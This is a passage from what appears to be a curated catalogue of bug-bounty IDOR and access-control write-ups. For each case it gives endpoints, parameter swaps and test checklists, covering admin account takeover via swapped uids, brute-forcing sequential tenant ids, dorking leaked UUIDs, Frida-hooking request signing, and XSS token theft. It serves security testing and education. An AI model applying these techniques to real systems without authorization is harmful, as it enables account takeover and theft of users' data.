- Test: payment/redirect requests carry a `reference_number`/`order_ref` — fuzz it; checkout/3rd-party-handoff steps are weakly authorized and leak PII.
- Q: "Is there a reference/order number in the payment redirect I can increment/brute to read other buyers' transactions and PII?"

### [283] NodeBB (CVE-2020-15149) — change-password request carries a `uid`; set it to the admin's (uid=1) → change admin's password → admin ATO/privesc — Muhammed Eren Uygun ($512) [DUP reinforcement: self-service password change keyed by swappable uid → admin id=1]
- Where: NodeBB change-password request with a `uid` field (admin uid=1, found by trying small numbers).
- Approach/how-found: the change-password request keyed on `uid` rather than the session; supplying your current password but replacing `uid` with `1` changed the admin's password → login as admin.
- Test: change-password/profile-update requests that carry a `uid`/`id` → swap to the admin's id (often 1) → admin ATO. For known forum/CMS software (NodeBB/Discourse/etc.), check public IDOR CVEs and the uid in self-service requests.
- Q: "Does the change-password request carry a `uid` I can set to the admin's (id=1)? Is this known software with a documented IDOR CVE?"

### [284] IDOR→account/project takeover: add child by public name, delete with omitted id, view→reassign manager — deteact ($25k, city-mobil 1M drivers) [NEW: add/delete-child + reassign]
- (1) Add project to an Enterprise group: `POST /api/projects/victim/children {"subdomain":"victim1"}` — the subdomain/name is public → add someone else's project to your group and inherit its Enterprise control.
- (2) Delete project: the request sends the whole group description serialized but **omits the target project id** — add/insert the victim's project id (`{"childrenProjects":[...,"id_project_victim"]}`) → delete others' projects. The id was "random" but readable in the project's public-page HTML.
- (3) User reassignment: an Improper-Access-Control bug let you view others' managers + ids; then an IDOR on profile-update let you **connect someone else's manager to your account by id** → inherit that manager's privileges/project (city-mobil: 1M drivers' passports/licenses).
- Test: add/remove a child resource by its public name/subdomain; in a "delete/update group" request that omits the item id, inject the victim's id; chain "view others' entities (leak id) → reassign that entity to yourself."
- Q: "Can I add a victim's resource to my group by its public name? Does a bulk delete/update request let me inject a victim id that was omitted? Can I reassign someone else's sub-entity (manager/member/project) to my account by id?"

### [285] SonicWall ~500k orgs: add-user IDOR via partyGroupId (conditional email check + global sequential id) — Pentest Partners [NEW: conditional ownership check]
- Where: `POST /api/users/add-user?emailAddress=<x>&...&partyGroupId=<7-digit>` on api.mysonicwall.com.
- Approach/how-found: any self-registered user could add themselves (or anyone) to ANY group in ANY tenant. The server checks `emailAddress` only when it **equals the email in your JWT** — supply a *different* email and the check is skipped, adding that user to `partyGroupId`. `partyGroupId` is a **globally unique sequential 7-digit integer across all tenants** → brute force → join any org → control firewalls/VPN/rules. (Vendor falsely claimed tenant IDs were "protected"; they were sequential.)
- Test: on add-user/invite/add-member, try an email different from your own — does the ownership/match check only fire when it equals yours? Is the group/tenant/party id a global sequential integer enumerable across tenants?
- Q: "Does the add-user/invite endpoint validate the email/owner ONLY when it matches my own (skipping the check otherwise)? Is the group/tenant id a global sequential int I can brute to land in other tenants?"

### [286] Fashion e-commerce — primary address endpoints resisted IDOR, but the CHECKOUT flow's alternate `saveaddress` accepted a foreign `id_customer_address` → delete a victim's address (cache hid it until re-login) — techkranti/Amey [NEW ★ alternate endpoint for the same object + cache-masked impact]
- Where: hardened `/customer/address/edit|delete` vs vulnerable `/checkout/shipment/saveaddress/` with `AddressForm[id_customer_address]`.
- Approach/how-found: the obvious address CRUD resisted IDOR (tried PP, id arrays, query-vs-body). The checkout flow had a DIFFERENT save-address endpoint; setting `id_customer_address` to another account's address id corrupted/deleted the victim's address. The change wasn't visible immediately (cache) — it appeared after the victim logged out and back in.
- Test: the same object usually has MULTIPLE endpoints (account vs checkout vs mobile/API) — when one is hardened, attack the alternates (different, weaker code paths). Verify destructive IDORs after a fresh session; caching hides the change otherwise.
- Q: "Does the same object have an alternate endpoint (checkout/mobile/API) with weaker authz? Did I re-login to confirm a destructive change the cache might mask?"

### [287] Profile-image upload — overwrite a victim's profile image; upload recon = arbitrary file type? storage location? naming convention? — Vuk Ivanovic [NEW: predictable upload path/name keyed by user → overwrite others' files] (tail member-locked; methodology captured from intro)
- Where: profile-image upload (stored on the same domain).
- Approach/how-found: upload recon — check whether arbitrary file types are accepted, WHERE the file is stored, and the NAMING CONVENTION. The bug allowed overwriting another user's profile image (the exact id/path swap is paywalled, but the lever is a predictable, user-keyed filename/path).
- Test: on uploads, note storage location + naming convention; if the path/filename is predictable or contains a user id, you may overwrite a victim's file. AWS storage → try XXE; same-domain → consider XSS via the filename in `img src`.
- Q: "Is the uploaded file's name/path predictable or keyed by a user id I can swap to overwrite a victim's file? Where is it stored (AWS→XXE, same-domain→XSS via filename)?"

### [288] Dating app — most id-keyed endpoints return only public profile data, but ONE returns PRIVATE fields (unread messages, notifications, new visits); swap the id → another user's private activity — neelam [NEW: distinguish public vs private fields across many id-keyed endpoints] (tail member-locked; technique captured)
- Where: dating-app user-details API keyed by a random number; response mixes public + private fields.
- Approach/how-found: many API endpoints leaked only publicly-known info (name/age/city), so they weren't reportable. One endpoint's response included PRIVATE fields — unread messages, notifications, new visits — for the logged-in user; swapping the id returned those for any user. The skill was spotting which fields are sensitive.
- Test: when most id-swaps return only public data, hunt the ONE endpoint that returns PRIVATE fields (unread counts, notifications, visits, settings, balances) — that's the real IDOR. Diff responses to separate public vs private fields.
- Q: "Among many id-keyed endpoints returning public data, is there one leaking PRIVATE fields (unread messages, notifications, visits) when I swap the id?"

### [289] IDOR dismissed for "unguessable UUID" → Google-dork `site:x inurl:<uuid>` finds 1,000+ indexed URLs leaking user UUIDs → change-email IDOR → reset → mass ATO — mechboy [NEW ★ defeat the UUID objection with search-engine indexing]
- Where: change-email request `{userId:UUID, email}`; UUIDs leaked in indexed URLs/reset links/cookie.
- Approach/how-found: swapping `userId` changed the victim's email → reset → ATO, but it was closed N/A ("UUID has high entropy, can't be guessed"). XSS-to-grab-UUID was a dup. The win: the UUID leaked in URLs, so `site:redacted.com inurl:"<uuid pattern>"` returned 1,000+ URLs containing real user UUIDs → harvest → mass ATO.
- Test: when an IDOR is dismissed for an "unguessable" UUID, Google/Bing-dork the domain for URLs/params containing UUIDs (`site:x inurl:<pattern>`); search engines index them at scale. A UUID in any URL is enumerable.
- Q: "Is the 'unguessable' UUID indexed by search engines (site:x inurl:)? Can I harvest victim UUIDs from results to mass-exploit the IDOR → ATO?"

### [290] Google Data Studio — `POST /deleteShareable {id, type}` deletes any file by id; the "unguessable" id is exposed in the share URL of any shared file — baluz ($5,000) [DUP reinforcement: destructive IDOR keyed by id that share links leak]
- Where: `POST datastudio.google.com /u/4/deleteShareable {"id":"<uuid>","type":0}`.
- Approach/how-found: the delete action keyed only on the file `id` (a UUID) with no ownership check; the id isn't guessable but is visible in the URL whenever a file is shared → delete other users' files/reports.
- Test: delete/destroy actions keyed by an object id exposed in share URLs → delete shared resources. "Unguessable" ids are still exploitable when shared links/embeds leak them.
- Q: "Does a delete/destroy action key on an id that's leaked in share URLs/embeds? Can I delete any shared file/report by supplying its id?"

### [291] Android — `exported=true` `ForgetConfirmPassword` activity launched directly (adb) bypasses forgot-password (insecure IPC); reset request had only `password` → add an `email` param → reset any user → ATO — Dheeraj Madhukar [NEW ★ exported-activity IPC + add-missing-identifier-param]
- Where: Android `com.example.ForgetConfirmPassword` (exported activity); reset-password JSON request (only `password`).
- Approach/how-found: apktool-decompiled the APK, searched AndroidManifest for `exported="true"`, found a `ForgetConfirmPassword` activity → `adb shell am start -n com.example.ForgetConfirmPassword` launches the protected screen directly (insecure IPC). Separately, the reset request had only a `password` param; adding an `email` param made the server reset that email's password → ATO of any user.
- Test: decompile APKs (apktool) and look for `exported=true` activities to invoke protected flows directly (adb am start). On reset/update requests, ADD a missing identifier param (`email`/`user_id`) — the server may honor it and act on other users.
- Q: "Are there exported Android activities I can launch to bypass a flow? Does a reset/update request honor an ADDED `email`/`id` param to act on other users?"

### [292] Facebook — "Make Featured Product in any video": GraphQL mutation accepts arbitrary `video_id` (not owned) + your `product_item_id` → tag your product as featured on anyone's video — abdellah yaala [NEW: cross-object write — attach YOUR object to a VICTIM's object]
- Where: `POST /api/graphql/` mutation `doc_id=2781671041948682`, `variables.input.video_id=<victim>`, `product_item_id=<attacker>`.
- Approach/how-found: as a page admin he created a shop product, then issued the "feature product" mutation with `video_id` set to a video he didn't own → his product appeared as Featured on the victim's high-traffic video; only removal was deleting the video.
- Test: "attach/tag/link my X to a Y" mutations — set Y (the container) to a victim's object id while X stays yours. Cross-object writes are a distinct IDOR class (parasitic placement, not data theft).
- Q: "Can I attach my own object (product/tag/comment/link) to a victim's object by swapping only the container id in a create/feature mutation?"

### [293] Microsoft Teams — Endpoint B leaks `itemid`/`ThreadId`; Endpoint A (PUT) writes by those ids with no ownership check → change file ownership, override content (`fileUrl`), or delete ANY user's chat file (cross-chat) — Aly Anwar [NEW ★ one endpoint leaks ids, another writes by them = full file takeover]
- Where: Teams chat file upload — Endpoint A PUT (`imidisplayname`, `itemid`, `fileUrl`, `content`); Endpoint B POST (leaks `ThreadId`, `itemid`).
- Approach/how-found: Endpoint B disclosed the object references (`itemid`, `ThreadId`); Endpoint A accepted them with no ownership check. Crafting a PUT with a victim's `itemid`+`id` (and `ThreadId` for other chats) let him change displayed ownership, override file content via `fileUrl`, and delete files — full takeover across chats. (MS controversially declined it, but the technique is sound.)
- Test: when one endpoint LEAKS object ids (itemid/threadId/messageId) and another WRITES by those ids without authz, combine them → take over/modify/delete others' objects. Swap the container id (threadId/chatId) for cross-tenant reach. Collab tools (Teams/Slack) file & message objects are prime.
- Q: "Does one endpoint leak object ids that another writes to without an ownership check? Can I override file content (fileUrl), spoof ownership, or delete by swapping itemid/threadId across chats?"

### [294] Tokopedia cart IDOR via X-User-ID / Tkpd-UserId headers + flag toggle — fadhilthomas ($135) [NEW reinforcement: multi-header id + state chain]
- Where: `/cart/v2/{shop_group,add_product_cart,update_cart,remove_product_cart}`.
- Approach: the user is identified by **HTTP headers** `X-User-ID` + `Tkpd-UserId` (and a body `user_id`). Swap all of them to the victim's id → view/add/change/delete the victim's cart. Chained: the read response leaks `cart_id`, which the update/delete steps require. The remove-product request carried `add_wishlist:0` — flipping it to `1` adds a product to the victim's wishlist instead.
- Test: identify EVERY id-bearing header (vendor-specific `X-*-UserId`) and swap them together; carry leaked object ids (cart_id) from read into write/delete; flip boolean flags to retarget the action.
- Q: "Are there multiple custom user-id headers I must swap together? Does a read leak an object id the write/delete needs? Does a 0/1 flag switch which action/target runs?"

### [295] Social app — comment `mentions[].uid` swap (uid from inspect-element) → notify/tag ANY user; 6-char group `access_code` brute → join any group + leak owner uid/name — Mukul Trivedi [NEW: mention-uid swap + short join-code brute]
- Where: comment JSON `mentions[].uid`+`key`; join-group `{membership:{access_code:"pgytsd"}}`.
- Approach/how-found: the UI only let him mention the post author, but the comment JSON carried the mention `uid`+`key` → swap to any user's uid (grabbed via inspect-element on a profile picture) → mention/notify anyone. Separately, the 6-char group `access_code` was brute-forceable → join any private group, and the join response leaked the group name/description + owner uid.
- Test: mention/tag/assign features keyed by a uid → swap to target arbitrary users (harvest uid from profile-pic elements/source). Short group/team join codes (6 chars) → brute to join private groups; the join response often leaks owner/group metadata.
- Q: "Can I swap a mention/tag/assign uid to target any user (uid from profile element)? Is the group join code short enough to brute, and does joining leak owner/group metadata?"

### [296] Invitation system — accept-invite `POST /activate-invited-user` lets the invitee set `email`+`password`; swap email to `owner@victim.com` → set the victim's password via the invite token → ATO (the odd `reset-multi-user-password` endpoint name was the tell) — Daniel Morais [NEW ★ invite token not bound to the invited email]
- Where: invite email delivered via a `reset-multi-user-password` endpoint; accept-invite `POST /activate-invited-user` with attacker-controlled `email`+`password`.
- Approach/how-found: the suspicious endpoint name (`reset-multi-user-password` for an invite) hinted at reused reset logic. The accept-invite request let the invited user set email+password; changing the `email` to a victim's and forwarding with a new password set the VICTIM's password (the invite token wasn't bound to the invited email) → ATO.
- Test: invitation/activation flows where the accept request carries an `email`+`password` you control → swap the email to a victim to set their password (token not bound to the invited address). Suspicious endpoint NAMES (reset logic behind an invite) signal reusable/abusable flows.
- Q: "Does the accept-invite/activate request let me set email+password? Can I swap the email to a victim to set their password via the invite token (token not bound to the invited email)? Do endpoint names hint at reused reset logic?"

### [297] Facebook Business Manager — `RemoveFundingSourceButtonV2CCMutation {biz_id, fs_id}` deletes saved credit cards with NO role check → terminate any business's running ads — Rohit kumar [NEW: destructive billing mutation keyed by org_id+resource_id, no role check]
- Where: `business.facebook.com` GraphQL `RemoveFundingSourceButtonV2CCMutation` with `biz_id` + `fs_id` (credit card id).
- Approach/how-found: the remove-funding-source mutation keyed only on `biz_id`+`fs_id` with no admin/role verification → delete any business's saved cards (USER B deletes BUSINESS A's cards) → all their ads stop. IDs obtained from ex-admin browser history or by brute-forcing the credit card id.
- Test: destructive business/billing mutations keyed by org_id+resource_id frequently skip role checks → remove others' payment methods/resources (high operational impact). Harvest the ids from your own past-admin history or brute them.
- Q: "Does a delete-payment / remove-resource mutation key only on org_id+resource_id without a role check? Can I disrupt a business by removing its funding sources?"

### [298] Facebook Series (Creator Studio) — inject a victim's image-id into a series' Poster/Cover; deleting the series cascade-deletes the victim's image — Pouya Darabi ($10,000) [NEW ★ container claims foreign object → cascade-delete]
- Where: FB Creator Studio "Series" feature; image-ids in Poster Art / Cover Image.
- Approach/how-found: a newly-added Series feature let you attach image-ids; modifying the request with a VICTIM's image-id made the series "own" that image. Deleting the series then cascade-deleted the victim's image.
- Test: "add to series/album/collection/playlist" features that attach object-ids without ownership checks → inject a victim's object id, then delete the CONTAINER → cascade-deletes their object. New features ship this pattern repeatedly (cf. Portal albums).
- Q: "Can I attach a victim's object id to a container (series/album/collection) I own, then delete the container to cascade-delete their object?"

### [299] ASPX/SOAP unauth via JS-referenced .asmx + ViewDocument.aspx?id= — elmahdi [NEW: SOAP/.asmx + document-viewer]
- Approach/how-found: recon (assetfinder→httprobe→get-title) found an ASPX LOGIN page with no registration; Google dork `site:care.redacted.com` surfaced more pages; View-Source → `config.js` referenced a SOAP service `/services/...asmx/`. Calling `GetCustomerinfobydoc?...&id=328915` (random id) returned full user PII **unauthenticated**. A second JS file revealed `/DocumentManagement/ViewDocumentImage.aspx?id=<docid>` → swap id → other users' document PDFs unauth. (Plus Telerik CVE-2017-9248 file-manager RCE.)
- Test: read JS/config for SOAP `.asmx`/`.svc` services and `*.aspx?id=` document viewers — these legacy .NET endpoints are frequently unauthenticated and id-keyed.
- Q: "Does JS reference a SOAP `.asmx`/`.svc` service with id-keyed methods that skip auth? Is there a ViewDocument/Image `.aspx?id=` serving files without auth? Is Telerik/old .NET in use?"

### [300] IDOR in the session cookie — `shoppingID=<hash>…SESSIONID<numeric-id>…` embeds a sequential user id; swap it → authenticate as other users → mass ATO — Zonduu [DUP reinforcement: IDOR lives in the cookie]
- Where: `shoppingID` session cookie containing an embedded numeric user id next to `SESSIONID` (e.g. `…SESSIONID3552522…`).
- Approach/how-found: while reproducing a CSRF issue he examined the session cookie and noticed a numeric id embedded alongside the session token; swapping that id authenticated him as other users → mass ATO.
- Test: dissect session cookies for an embedded user id (often adjacent to / labeled near SESSIONID); if sequential, swap it → session hijack. IDOR isn't only in URLs/bodies — it's in cookies too.
- Q: "Does the session cookie embed a (sequential) user id I can swap to hijack other users' sessions?"

### [301] IDOR (write-not-read) + ownership transfer via mass assignment (CWE-915) → total compromise — jub0bs [NEW ★ overtrusting PUT / ownerId in body]
- Where: app platform; `GET/PUT /accounts/<accId>/apps/<appUuid>`; app UUIDs are PUBLIC.
- Approach/how-found: `GET /accounts/<victimAcc>/apps/<victimUuid>` with attacker token → 403 (read protected). But `GET /accounts/<MY_acc>/apps/<victimUuid>` (his own account id + victim's app uuid) returned a weird `200 null` (text/html) — a tell. Then `PUT /accounts/<MY_acc>/apps/<victimUuid>` {title,url} → 200 and it modified the VICTIM's app (write IDOR even though read was blocked). The PUT response included an `accountId` field → he added `{"accountId":<MY_acc>}` to the PUT body → **transferred ownership** of the victim's app to himself (the update blindly accepts any known field = mass assignment / CWE-915). POST/DELETE shared the same IDOR. UUIDs public → own any app in the system.
- Test: when read 403s, try the WRITE verb under YOUR OWN account-path with the victim's object id; inspect the response for owner/account fields and try setting `accountId/ownerId/userId` in the update body to steal the object. (Tool: Firefox Multi-Account Containers for fast identity switching.)
- Q: "Is the write (PUT/POST/DELETE) open even when read returns 403, especially under my-own-account-path + victim-object-id? Does the response expose an owner/account field I can set in the body to transfer ownership to me (CWE-915)?"

### [302] Source/JS reading → hidden `tab=secret` param value (not in UI) on a `user_id` endpoint → sensitive data — hack4bounty [NEW: recon for hidden param VALUES, not just params]
- Where: an endpoint with `user_id` + a hidden `tab` param whose `secret` value isn't exposed in the UI.
- Approach/how-found: reading the source/JS surfaced an endpoint and a `tab` parameter; setting `tab=secret` (a value never shown in the UI) returned sensitive data the normal flow hid. The program asked how he found a param that wasn't in the UI — recon.
- Test: read source/JS for endpoints AND for hidden param VALUES (`tab=secret`, `view=admin`, `mode=debug`, `type=internal`). Enumerate enum-style param values, not just the param names.
- Q: "Does source/JS reveal hidden param values (tab=secret, view=internal, mode=debug) that unlock sensitive data on an id-keyed endpoint?"

### [303] E-commerce — order READ was 401 when swapped, but the cancel-order ACTION keyed by a sequential order id wasn't protected → cancel any user's order (200=done, 404=none) — Md Saikat (10k BDT) [DUP reinforcement: read-protected ≠ action-protected]
- Where: cancel-order endpoint keyed by a sequential order id (the order-view endpoint returned 401 on swap).
- Approach/how-found: swapping the order id on the VIEW page gave 401, but the cancel-order ACTION endpoint accepted a swapped order id → 200 → cancelled another user's order without access. 200 vs 404 confirmed hits.
- Test: when reading an object is protected, test the ACTIONS on it (cancel/refund/delete/update) — they're often unprotected separately. 200-vs-404 is the exists/hit oracle. Read-protected does not mean action-protected.
- Q: "Is the cancel/refund/delete/update ACTION on an object protected even though its read is? Can I act on any object by swapping a sequential id?"

### [304] "One Param → $10k" — harvest EVERY param from Burp history into a wordlist, fuzz across all endpoints AND fuzz method (GET/POST/PUT/DELETE) + Content-Type (json↔form) → endpoints disclose plaintext passwords — Bilal Khan [NEW ★ cross-endpoint param + method + content-type fuzzing]
- Where: `api.redacted.com /v2/*` (React app, Bearer auth, no CSRF); params cross-pollinated from other requests.
- Approach/how-found: nothing obvious, so he saved ALL parameters seen in Burp history into a wordlist and fuzzed them across endpoints with Intruder positions on method/path/param/value (`§CHECK§ /v2/§one§?§two§=§three§`) → password disclosure ($1k). Then he swapped HTTP methods (GET↔POST↔PUT↔DELETE) and Content-Types (json↔form) → many more endpoints leaked plaintext passwords ($10k). The winning params didn't belong to the original requests.
- Test: build a param wordlist from ALL of Burp history → fuzz it on EVERY endpoint; ALSO fuzz the HTTP method and Content-Type (json↔x-www-form-urlencoded). Foreign params + alternate methods unlock sensitive data the normal request hides.
- Q: "Have I fuzzed every harvested param across every endpoint with every method + content-type? Do params from unrelated requests unlock data elsewhere?"

### [305] Chained IDOR + XSS → ATO — a 'low-impact' profile IDOR controls the username, which is reflected UNSANITIZED on a points page; store XSS via the IDOR → steal auth token → ATO — Bilal Khan ($1,050) [DUP reinforcement: downgraded IDOR-write + reflected field = token theft]
- Where: profile-update IDOR (username field, couldn't change primary email); a profile-points endpoint reflecting username unsanitized.
- Approach/how-found: the IDOR only changed profile data (not the login email) and was downgraded to P4. But a points page reflected the username without sanitization → he set the username (via the IDOR) to an XSS payload → exfiltrated the auth token → ATO.
- Test: a "low-impact" profile-write IDOR becomes critical if any field it controls is reflected unsanitized elsewhere (points/leaderboard/activity/public profile) → store XSS in that field → steal the auth token → ATO. Re-examine downgraded IDORs for a rendering sink.
- Q: "Does a low-impact profile IDOR control a field rendered unsanitized elsewhere? Can I store XSS via the IDOR to steal the auth token → ATO?"

### [306] Razer Pay $6,000: defeat request-signing to unlock IDORs (offline re-sign + Frida hook) — sambal0x [NEW ★ beat anti-tamper signatures]
- Where: e-wallet Android app; every GET/POST carries a calculated `signature` to prevent tampering.
- Approach/how-found: copying another user's signed request failed (sig bound to session). Decompiled APK (apktool + jadx) → found `MD5Encode` signing method → copied the Java into IntelliJ and recomputed signatures OFFLINE (matched a real one to confirm). Then on `/deleteBankAccount?id=<seq>` he computed valid sigs for predictable ids → deleted another account's bank account. Other endpoints used different/obfuscated signing → used **Frida to hook `MD5Encode`** so the app re-signs his tampered payloads automatically → mass IDOR (join chat groups, read messages, steal shared "red-packet" money, view/modify transactions/PII).
- Test: if tampering is blocked by a client signature/HMAC, either reverse the signing function and re-sign offline, or Frida-hook the signing method to auto-sign tampered requests — then run normal IDOR tests underneath.
- Q: "Is parameter tampering blocked only by a client-side signature? Can I reverse/Frida-hook the signing routine to re-sign arbitrary payloads, then swap ids freely?"

### [307] Multi-tier email SaaS — cross-tier privesc: tier-1 (central admin) and tier-2 (client admin) share the same cookie/session, so replaying ~100 captured tier-1 API calls in a tier-2 session exposed 11 unprotected endpoints leaking all clients' infra/PII — Akshar Tank [NEW ★ shared session across privilege tiers → systematically replay the higher tier's API surface in the lower role]
- Where: stacked apps (central-admin / client-admin / email) where tier-1 and tier-2 used identical cookies (tier-3 used a JWT).
- Approach/how-found: noticed the cookie for tier-1 and tier-2 looked the same → hypothesized one backend serves both. Opened tier-1 in one browser + tier-2 in another, walked the entire tier-1 admin UI capturing ~100 API calls, then replayed every one inside the tier-2 client-admin session. Most returned "authenticated but no rights", but 11 had broken authz → leaked other clients' IPs, domains, CPU/RAM/HDD, licenses, and user profiles+ACLs.
- Test: when a lower-priv panel shares cookies/host/token with a higher-priv panel, capture the ENTIRE high-priv API surface and replay each call in the low-priv session — authz is usually per-endpoint, so a subset will be unguarded. Note which tiers share auth vs use a separate token.
- Q: "Do the admin and user panels share a session/cookie/backend? If I replay every admin API call with my low-priv session, which endpoints forgot to check my role?"

### [308] Unlock a blocked account — reuse the blocked account's reset token in a NON-blocked reset flow; after the fix, supply the token as a duplicate/extra param (HPP) to re-bypass — Maria Zulfiqar [NEW ★ token reuse across flows + HPP patch bypass]
- Where: password-reset flow; reset token moved between blocked and valid accounts; extra `password_reset_token` param.
- Approach/how-found: brute-locked her own account (paid unlock). The reset email still arrived when blocked, but the success page refused it. Copying the blocked account's reset token into a VALID account's reset request (Burp) completed the reset → account back. After it was fixed, adding the same token as an ADDITIONAL parameter (`password_reset_token=<blockedtoken>`) bypassed the patch again.
- Test: when an action is blocked at one layer, reuse its token/value in a different (unblocked) flow. After a fix, retry the value as a duplicate/extra parameter (HPP) — patches often guard one parameter position but not a second.
- Q: "Can I reuse a blocked/denied token in an unblocked flow? After a fix, does supplying the value as a duplicate/extra param (HPP) bypass the patch?"

### [309] Google Crisis Map: member-permission field accepts arbitrary id → discloses that user's email (enumerate 32k) — websecblog [NEW: id→email via member list]
- Where: domain settings "Members" add form → `POST .../.admin`.
- Approach/how-found: adding a member sends `new_user`+`new_user.permission`; re-saving showed permissions keyed by a short numeric id (`123456.permission`) while the UI lists members by EMAIL. Sending `123457.permission` ADDED user id 123457 as a member → the Members page then revealed their EMAIL. IDs are incremental from 0 (latest ~32000) → enumerate every registered user's email.
- Test: a "set member/permission for id N" field that accepts an arbitrary user id, then surfaces that user's email/name in the member list = an id→PII oracle; check if ids start at 0/sequential.
- Q: "Does a member/permission/role field accept an arbitrary user id and then disclose that user's email in the member list? Are ids sequential from 0?"

### [310] VLC iOS WiFi-share unauth IDOR — inputzero [NEW: local share-server]
- "Network > Sharing via WiFi" runs an unauthenticated web server on port 80 listing shared media; crawl the device IP to download videos without consent. Test mobile "share over WiFi/local" features for unauth listing.
- Q: "Does a 'share over WiFi/local network' feature run an unauthenticated web server I can crawl for other users' files?"

### [311] LinkedIn iOS — BLIND IDOR: swapping 9-digit `twitterId` on link/unlink-twitter returns an identical `200 OK` with no visible effect, but the UNLINK silently executes on the victim → brute-unlink everyone's Twitter — Prudhvi Danyamraju [NEW ★ "Blind IDOR": response is identical for success/failure; only confirmed by USING the feature afterward]
- Where: LinkedIn link-Twitter (post-cross-posting) + unlink `https://www.linkedin.com/psettings/twitter-accounts/delete`, POST param `twitterId` (9-digit int).
- Approach/how-found: swapping `twitterId` always returned `{responseCode:200}` whether or not it worked, so it looked like a false positive. Out of curiosity he actually exercised the feature (posted with sharing ON) and his post DIDN'T cross-post → realized the earlier swapped-id request had blindly unlinked the account server-side despite the UI still showing "linked". So the IDOR was real but blind. 9-digit id → brute to mass-unlink every user.
- Test: when an id-swap returns a generic 200 with no diff, don't discard it — perform/observe the actual feature afterward (or in a second account) to detect silent side effects. Treat identical success/failure responses as a reason to verify state, not to dismiss.
- Q: "Does this id-swap really do nothing, or is the response just always 200? If I use the feature now, did my swapped request silently change the victim's (or my) state?"

### [312] Reset-submit body carries `email` → swap to victim → password set + auto-login (admin email = admin ATO); found on an overlooked subdomain — Swapmaurya (P1) [DUP reinforcement: email-in-reset-body ATO + pivot to subdomains]
- Where: `POST /login/internalResetPasswordSubmit {email, password, confirmPassword}` on a subdomain.
- Approach/how-found: main domain was picked clean (dupes); pivoted to subdomains. The reset-submit request carried the `email` in the body → swapping it to a victim set their password and logged him straight into their account; the admin email → admin ATO.
- Test: reset/change-password SUBMIT requests that carry `email` in the body → swap to a victim → set their password (auto-login). When the main domain is exhausted, move to subdomains.
- Q: "Does the reset-submit body carry an `email` I can swap to set a victim's password and auto-login? Have I pivoted to subdomains after main-domain dupes?"

### [313] Facebook Business Manager — disclose ANY user's role+permission detail on ANY app: `POST /business/objects/fetch/permissions/users/` `asset_type=app&asset_id=<app>&user_id=<victim>&business_id=<attacker>` (Pages checked, apps not) — Amol Baikar [DUP-reinforce of [316]: asset-type inconsistency on the permissions-fetch endpoint]
- Where: `POST /business/objects/fetch/permissions/users/` body `asset_id`, `asset_type=app`, `user_id`, `business_id`.
- Approach/how-found: revisiting Business Manager a year after his app-admins bug, he found the permissions-fetch endpoint also enforced authz for `asset_type=Pages` but not for `apps` → returns the aggregated permissions/role any user holds on any app, regardless of business assignment.
- Test: re-test a previously-fixed endpoint family after redesigns, and re-check EACH `asset_type`/`object_type` — fixes are often applied to one type only. The "fetch permissions/roles for user X on object Y" call is a relationship-disclosure IDOR.
- Q: "Does the permissions/roles endpoint enforce ownership for every asset_type, or only the common one? Can I read a target user's role on a foreign app with my own business_id?"

### [314] REST `PUT /users/{mongoID}` honors a swapped path id with your own JWT → update + read any account's name/email/referral/company; MongoID looks secret but the endpoint has no brute-protection — vict0ni [NEW ★ keep-your-token + swap-the-path-id + MongoID brute]
- Where: `PUT /users/{24-hex ObjectId}` (own `Authorization: Bearer`, swap the path id).
- Approach/how-found: updating his own profile used `PUT /users/<myId>`; swapping the path id to account B's (while keeping his JWT) updated B's first/last name and leaked B's email, referral code (worth $30), companyID, subscription, phone, VAT, and `role`. The ObjectId is "secret", but the endpoint had no brute protection (24-hex space, generatable).
- Test: REST `PUT/PATCH /users/{id}` with the id in the path → swap to other ids while keeping your token. MongoIDs aren't fully random and there's often no rate limit → mass enumeration; responses leak role/company/referral.
- Q: "Does `PUT /users/{id}` honor a swapped path id with my token? Is the id a MongoID with no rate limit (mass-enumerable)? Does the response leak role/referral/company?"

### [315] Airline — a check-in request keys on ONLY `bookingRef` (drops the required lastname); swap → any passenger's PII; 6-char bookingRef = brute-able. Tips: accept integers where guids are shown; inject `"id":1` into JSON for blind IDOR — zseano [NEW ★ drop-the-second-factor + inject-id:1 blind IDOR]
- Where: airline check-in / booking-info endpoints keyed by `bookingRef` (a variant dropped the lastname second factor).
- Approach/how-found: used the site as intended (bought a £20 ticket → bookingRef). Viewing a booking normally needs bookingRef + lastname, but one request fetched passenger info with only `bookingRef` → swap → other passengers' PII across many features. 6-char bookingRefs → generate all combos → mass scrape.
- Test: find the request variant that drops a second identifier (lastname/DOB) and keys on a short guessable ref (PNR/bookingRef) → enumerate. Try integer ids where the UI shows guids/encrypted values; inject `"id":1` into JSON bodies that don't include it (blind IDOR).
- Q: "Is there a request variant that drops a second factor (lastname) and keys on a short guessable ref? Does the app accept integers where it shows guids? Did I inject `id:1` into JSON bodies that omit it (blind IDOR)?"

### [316] Facebook Business Manager — disclose the full admin list of ANY app: `POST /business/aymc_assets/admins/` `asset_ids[0]=TARGET_APP_ID&business_id=<attacker biz>`; the Pages asset-type was authz-checked but the **apps** asset-type was not — Amol Baikar [NEW ★ asset-TYPE inconsistency: same endpoint enforces ownership for one object type, forgets it for another]
- Where: `POST /business/aymc_assets/admins/` (Business Manager "fetch admins for an asset"); params `asset_ids[]`, `business_id`.
- Approach/how-found: the admin-list endpoint served multiple asset types; the call for Pages was secured, but for `apps` it returned the admin/developer list of ANY app id, regardless of whether the app was assigned to the attacker's business → names+ids of all app admins.
- Test: when one endpoint handles several object types (`asset_type`/`type`/the id's namespace), test EACH type separately — devs often add the ownership check for the obvious type and miss the others. Put your own `business_id`/`org_id` and a foreign object id.
- Q: "Does this multi-type endpoint enforce ownership for every asset_type, or only the common one? Can I read a foreign object of a less-common type with my own org/business id?"

### [317] Facebook Events — co-host selection limited to friends in UI, but swapping `co_hosts[0]` in the submit to a non-friend/blocked user id adds them as co-host (server skips the friendship check) — whoisbinit ($750) [NEW: "select a friend/member" feature doesn't enforce the relationship server-side]
- Where: `POST /ajax/create/event/submit/ co_hosts[0]={userID}`.
- Approach/how-found: the UI only lets you pick friends as co-hosts; selecting a friend (User B, id 1008) and intercepting the submit, then replacing `co_hosts[0]` with a non-friend/blocked user's id (User C, 31337), added User C as co-host (with a notification) — the server didn't enforce the friendship.
- Test: when a feature restricts selection to friends/members (co-host, share-with, assign, invite), swap the id in the request to a non-eligible user — the relationship check is often UI-only. Impact: forced association / notification spoofing even on blocked users.
- Q: "Does a 'select a friend/member' feature enforce the relationship server-side, or can I swap the id to a non-friend/blocked/arbitrary user?"

### [318] Accidental delete IDOR — team-member delete request with `user_id=1` deleted the ADMIN account → delete any account — Sayaan Alam ($300) [DUP reinforcement: delete-by-user_id, admin = id 1]
